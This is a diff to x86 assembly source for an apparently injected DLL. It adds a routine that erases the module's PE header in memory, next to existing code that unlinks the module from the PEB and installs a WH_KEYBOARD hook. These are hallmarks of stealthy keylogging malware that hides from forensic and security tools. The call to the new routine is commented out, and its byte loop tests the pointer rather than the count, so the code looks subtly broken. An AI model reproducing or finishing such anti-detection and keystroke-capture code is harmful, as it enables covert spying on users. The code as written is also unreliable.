@@ -66,6 +66,36 @@ proc RELINK entry
      ret
 endp
 
+proc EraseModuleHeader
+     local old dd ?
+     local new dd PAGE_EXECUTE_READWRITE
+     local size dd ?
+     mov eax,[ecx+IMAGE_DOS_HEADER.e_lfanew]
+     add eax,sizeof.IMAGE_NT_HEADERS
+     mov [size],eax
+     push ecx
+	  lea edx,[old]
+	  invoke VirtualProtect,ecx,eax,[new],edx
+     pop ecx
+
+     mov eax,[size]
+     .while eax>=4
+	   mov dword[ecx],0
+	   add ecx,4
+	   sub eax,4
+     .endw
+
+     .while ecx>0
+	   mov byte[ecx],0
+	   inc ecx
+	   dec eax
+     .endw
+     mov eax,[size]
+     sub ecx,eax
+     lea edx,[new]
+     invoke VirtualProtect,ecx,eax,[old],edx
+     ret
+endp
 
 proc UnlinkModuleFromPEB
      ;push ebx
@@ -136,6 +166,8 @@ proc initialize
    mov ecx,[hCurrentMod]
    call UnlinkModuleFromPEB
    mov [unlinkedLdr],eax
+   ;mov ecx,[hCurrentMod]
+   ;stdcall EraseModuleHeader
    invoke SetWindowsHookEx,WH_KEYBOARD,KeyboardProc,[hCurrentMod],<invoke GetCurrentThreadId>
    .if eax
        mov [hhook],eax
@@ -789,7 +821,8 @@ data import
 
      import kernelbase,\
      GetCurrentThreadId,'GetCurrentThreadId',\
-     DisableThreadLibraryCalls,'DisableThreadLibraryCalls'
+     DisableThreadLibraryCalls,'DisableThreadLibraryCalls',\
+     VirtualProtect,'VirtualProtect'
      ;OutputDebugString,'OutputDebugStringA',\
      ;OutputDebugStringW,'OutputDebugStringW'
 
